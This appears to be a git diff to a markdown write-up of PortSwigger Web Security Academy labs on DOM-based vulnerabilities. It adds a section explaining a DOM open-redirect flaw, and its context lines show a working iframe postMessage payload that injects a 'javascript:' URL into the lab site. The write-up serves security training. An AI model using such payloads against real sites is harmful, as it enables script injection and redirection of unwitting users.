@@ -29,7 +29,7 @@ When the iframe loads, the postMessage() method sends a web message to the home 
 ###  2. DOM XSS using web messages and a JavaScript URL
 **Objective**: This lab demonstrates a DOM-based redirection vulnerability that is triggered by web messaging. To solve this lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the print() function.<br>
 Below is the snippet code we found in application home page while trying to view using View Page source.
-```html
+```js
  <script>
    window.addEventListener('message', function(e) {
      var url = e.data;
@@ -89,4 +89,12 @@ Howevever to trigger the XSS the data type should be load-channel. Lets craft th
 ```html
 <iframe src=https://YOUR-LAB-ID.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
 ```
+### 4. DOM-based open redirection
+**Objective**: This lab contains a DOM-based open-redirection vulnerability. To solve this lab, exploit this vulnerability and redirect the victim to the exploit server.<br>
+Below is the snippet code we found in application home page while trying to view using View Page source.
+```html
+<a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : "/"'>Back to Blog</a>
+```
+This code is vulnerable to a DOM-based open redirect because it extracts a URL directly from the user's browser address bar (location) and immediately instructs the browser to navigate to that URL without validating where it goes. You can add url parameter in browser address bar on this page and then click on 'Back to Blog<' hyperlink in the page.
+
 
